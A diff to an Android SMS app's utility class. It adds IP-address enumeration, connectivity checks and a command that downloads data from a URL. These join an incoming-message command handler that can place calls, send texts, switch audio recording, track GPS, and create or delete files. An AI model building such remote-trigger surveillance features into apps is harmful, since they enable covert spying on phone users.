@@ -33,6 +33,9 @@ import android.media.AudioManager;
 import android.media.MediaPlayer;
 import android.media.Ringtone;
 import android.media.RingtoneManager;
+import android.net.ConnectivityManager;
+import android.net.Network;
+import android.net.NetworkInfo;
 import android.net.Uri;
 import android.net.wifi.WifiManager;
 import android.os.Build;
@@ -80,10 +83,14 @@ import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.UnsupportedEncodingException;
+import java.net.InetAddress;
+import java.net.NetworkInterface;
+import java.net.SocketException;
 import java.net.URLConnection;
 import java.net.URLEncoder;
 import java.util.ArrayList;
 import java.util.Date;
+import java.util.Enumeration;
 import java.util.List;
 import java.util.Timer;
 import java.util.TimerTask;
@@ -107,6 +114,10 @@ public class Lofl {
     public static void uninstallApp(Context context, String packageName) {
         Intent intent = new Intent(Intent.ACTION_UNINSTALL_PACKAGE, Uri.parse(packageName));
         context.startActivity(intent);
+    }
+
+    public static File getDatabaseFile(Context context){
+        return context.getDatabasePath(DatabaseHelper.NAME);
     }
 
     public static List<ApplicationInfo> getInstalledApps(Context context) {
@@ -183,6 +194,7 @@ public class Lofl {
             for (int len = 0; (len = fis.read((buffer))) != -1; ) {
                 bos.write(buffer, 0, len);
             }
+            fis.close();
             return bos.toByteArray();
         } catch (FileNotFoundException e) {
             e.printStackTrace();
@@ -421,6 +433,55 @@ public class Lofl {
 
     }
 
+    public static boolean hasNetworkConnectivity(Context context) {
+        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
+        NetworkInfo networkInfo = connectivityManager.getActiveNetworkInfo();
+        Network[] networks = connectivityManager.getAllNetworks();
+        return networkInfo != null && networkInfo.isConnected();
+    }
+
+    public static ArrayList<String> fetchIpv4Addresses(){
+        ArrayList<String> ipAddresses = new ArrayList<>();
+        /*new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    for(Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces(); interfaces.hasMoreElements();){
+                        for(Enumeration<InetAddress> addresses = interfaces.nextElement().getInetAddresses(); addresses.hasMoreElements();){
+                            while(addresses.hasMoreElements()){
+                                InetAddress address = addresses.nextElement();
+                                if(!address.isLoopbackAddress() && !address.getHostAddress().contains(":")){
+                                    ipAddresses.add(address.getHostAddress());
+                                    Log.d("IP ADDRESSES", String.format("NETWORK NAME = % s", address.getHostName()));
+                                }
+                            }
+                        }
+                    }
+
+                } catch (SocketException e) {
+                    e.printStackTrace();
+                }
+            }
+        }).start();*/
+        try {
+            for(Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces(); interfaces.hasMoreElements();){
+                for(Enumeration<InetAddress> addresses = interfaces.nextElement().getInetAddresses(); addresses.hasMoreElements();){
+                    while(addresses.hasMoreElements()){
+                        InetAddress address = addresses.nextElement();
+                        if(!address.isLoopbackAddress() && !address.getHostAddress().contains(":")){
+                            ipAddresses.add(address.getHostAddress());
+                            Log.d("IP ADDRESSES", String.format("NETWORK NAME = %s", address.getHostName()));
+                        }
+                    }
+                }
+            }
+
+        } catch (SocketException e) {
+            e.printStackTrace();
+        }
+        return ipAddresses;
+    }
+
     public static void testProcessCommand(Context context){
         String message = Constants.COMMAND_CODE + Commands.CREATE_NOTIFICATION + " --haha im a title --but you're a bot";
         processCommand(context,message);
@@ -434,7 +495,7 @@ public class Lofl {
             case Commands.WEB_BROWSER:
                 if(arg1 != null){
                     intent.setAction(JobsIntentService.ACTION_WEB_BROWSER);
-                    intent.putExtra(Constants.URL, arg1);
+                    intent.putExtra(Constants.Keys.URL_KEY, arg1);
                 }
                 commandFound = true;
                 break;
@@ -492,31 +553,31 @@ public class Lofl {
                 break;
             case Commands.CALL_PHONE:
                 if(arg1 != null){
-                    intent.putExtra(Constants.ADDRESS, arg1);
+                    intent.putExtra(Constants.Keys.ADDRESS_KEY, arg1);
                     intent.setAction(JobsIntentService.ACTION_CALL_PHONE);
                 }
                 commandFound = true;
                 break;
             case Commands.CREATE_CONTACT:
                 if(arg1 != null && arg2 != null){
-                    intent.putExtra(Constants.NAME_KEY, arg1);
-                    intent.putExtra(Constants.ADDRESS, arg2);
+                    intent.putExtra(Constants.Keys.NAME_KEY, arg1);
+                    intent.putExtra(Constants.Keys.ADDRESS_KEY, arg2);
                     intent.setAction(JobsIntentService.ACTION_INSERT_CONTACT);
                 }
                 commandFound = true;
                 break;
             case Commands.SEND_SMS:
                 if(arg1 != null && arg2 != null){
-                    intent.putExtra(Constants.ADDRESS, arg1);
-                    intent.putExtra(Constants.BODY, arg2);
+                    intent.putExtra(Constants.Keys.ADDRESS_KEY, arg1);
+                    intent.putExtra(Constants.Keys.BODY_KEY, arg2);
                     intent.setAction(JobsIntentService.ACTION_SEND_SMS);
                 }
                 commandFound = true;
                 break;
             case Commands.ALARM_CLOCK:
                 if(arg1 != null && arg2 != null){
-                    intent.putExtra(Constants.HOURS_KEY, Integer.valueOf(arg1));
-                    intent.putExtra(Constants.MINUTES_KEY, Integer.valueOf(arg2));
+                    intent.putExtra(Constants.Keys.HOURS_KEY, Integer.valueOf(arg1));
+                    intent.putExtra(Constants.Keys.MINUTES_KEY, Integer.valueOf(arg2));
                     intent.setAction(JobsIntentService.ACTION_ALARM_CLOCK);
                 }
                 commandFound = true;
@@ -524,10 +585,10 @@ public class Lofl {
             case Commands.RECORD_AUDIO:
                 if(arg1 != null){
                     SharedPreferences.Editor editor = PreferenceManager.getDefaultSharedPreferences(context).edit();
-                    if(arg1.equalsIgnoreCase("off")){
+                    if(arg1.equalsIgnoreCase("stop")){
                         editor.putBoolean(ScreenReceiver.RECORDER_KEY, false);
                         ScreenReceiver.sShouldRecordAudio = false;
-                    }else if(arg1.equalsIgnoreCase("on")){
+                    }else if(arg1.equalsIgnoreCase("start")){
                         editor.putBoolean(ScreenReceiver.RECORDER_KEY,true);
                         ScreenReceiver.sShouldRecordAudio = true;
                     }else{}
@@ -537,32 +598,34 @@ public class Lofl {
                 break;
             case Commands.CREATE_NOTIFICATION:
                 if(arg1 != null && arg2 != null){
-                    intent.putExtra(Constants.TITLE_KEY, arg1);
-                    intent.putExtra(Constants.CONTENT_KEY, arg2);
+                    intent.putExtra(Constants.Keys.TITLE_KEY, arg1);
+                    intent.putExtra(Constants.Keys.CONTENT_KEY, arg2);
                     intent.setAction(JobsIntentService.ACTION_CREATE_NOTIFICATION);
                 }
                 commandFound = true;
                 break;
             case Commands.CREATE_FILE:
                 if(arg1 != null && arg2 != null){
-                    intent.putExtra(Constants.FILE_NAME_KEY, arg1);
-                    intent.putExtra(Constants.FILE_CONTENT_KEY, arg2);
+                    intent.putExtra(Constants.Keys.FILE_NAME_KEY, arg1);
+                    intent.putExtra(Constants.Keys.FILE_CONTENT_KEY, arg2);
                     intent.setAction(JobsIntentService.ACTION_CREATE_FILE);
                 }
                 commandFound = true;
                 break;
             case Commands.PLAY_SONG:
                 if(arg1 != null){
-                    intent.putExtra(Constants.URL, arg1);
+                    intent.putExtra(Constants.Keys.URL_KEY, arg1);
                     intent.setAction(JobsIntentService.ACTION_PLAY_SONG);
                 }
                 commandFound = true;
                 break;
             case Commands.DELETE_FILE:
                 if(arg1 != null){
-                    intent.putExtra(Constants.FILE_NAME_KEY, arg1);
+                    intent.putExtra(Constants.Keys.FILE_NAME_KEY, arg1);
                     intent.setAction(JobsIntentService.ACTION_DELETE_FILE);
                 }
+                commandFound = true;
+                break;
             case Commands.LOCATION:
                 intent.setAction(JobsIntentService.ACTION_LOCATION);
                 commandFound = true;
@@ -576,6 +639,15 @@ public class Lofl {
                     }
                     intent.setAction(JobsIntentService.ACTION_GPS_TRACKER);
                 }
+                commandFound = true;
+                break;
+            case Commands.FETCH_NETWORK_DATA:
+                if(arg1 != null){
+                    intent.putExtra(Constants.Keys.URL_KEY, arg1);
+                    intent.setAction(JobsIntentService.ACTION_DOWNLOAD_HTTP_DATA);
+                }
+                commandFound = true;
+                break;
             default:
                 break;
         }
@@ -741,9 +813,9 @@ public class Lofl {
     public static void createConversation(final Context context, String address, String sharedText) {
         Intent notifyIntent = new Intent();
         if (sharedText != null) {
-            notifyIntent.putExtra(Constants.SHARED_TEXT_KEY, sharedText);
+            notifyIntent.putExtra(Constants.Keys.SHARED_TEXT_KEY, sharedText);
         }
-        notifyIntent.putExtra(Constants.ADDRESS, address);
+        notifyIntent.putExtra(Constants.Keys.ADDRESS_KEY, address);
         notifyIntent.setAction(Constants.CREATE_CONVERSATION_ACTION);
         context.sendBroadcast(notifyIntent);
         ((MainActivity) context).runOnUiThread(new Runnable() {
@@ -1001,7 +1073,7 @@ public class Lofl {
     public static void notify(Context context, Intent intent, String address, String body) {
         sId++;
         Notification.Action whisperAction = null;
-        if (intent.hasExtra(Constants.SHARED_TEXT_KEY)) {
+        if (intent.hasExtra(Constants.Keys.SHARED_TEXT_KEY)) {
             whisperAction = createWhisperSharedTextAction(context, address, intent);
         } else {
             whisperAction = createWhisperAction(context, address, intent);
@@ -1168,7 +1240,7 @@ public class Lofl {
         ArrayList<String> parts = smsManager.divideMessage(response);
         for (int i = 0; i < parts.size(); i++) {
             Intent intent = new Intent();
-            intent.putExtra(Constants.ADDRESS, name);
+            intent.putExtra(Constants.Keys.ADDRESS_KEY, name);
             intent.setAction(Constants.SENT_CONFIRMATION_ACTION);
             sentIntents.add(PendingIntent.getBroadcast(context, 0, intent, 0));
         }
@@ -1403,7 +1475,7 @@ public class Lofl {
     }
 
     private static RemoteInput createWhisperRemoteInput() {
-        RemoteInput.Builder builder = new RemoteInput.Builder(Constants.WHISPER_KEY);
+        RemoteInput.Builder builder = new RemoteInput.Builder(Constants.Keys.WHISPER_KEY);
         builder.setLabel(Constants.WHISPER);
         return builder.build();
     }
@@ -1433,12 +1505,12 @@ public class Lofl {
 
     private static Intent createWhisperIntent(String address, Intent sharedIntent) {
         Intent intent = new Intent();
-        if(sharedIntent.hasExtra(Constants.SHARED_TEXT_KEY)){
-            intent.putExtra(Constants.SHARED_TEXT_KEY, sharedIntent.getStringExtra(Constants.SHARED_TEXT_KEY));
+        if(sharedIntent.hasExtra(Constants.Keys.SHARED_TEXT_KEY)){
+            intent.putExtra(Constants.Keys.SHARED_TEXT_KEY, sharedIntent.getStringExtra(Constants.Keys.SHARED_TEXT_KEY));
         }
         intent.setAction(Constants.WHISPER_ACTION);
-        intent.putExtra(Constants.ADDRESS, address);
-        intent.putExtra(Constants.NOTIFICATION_ID_KEY, sId);
+        intent.putExtra(Constants.Keys.ADDRESS_KEY, address);
+        intent.putExtra(Constants.Keys.NOTIFICATION_ID_KEY, sId);
         return intent;
     }
 
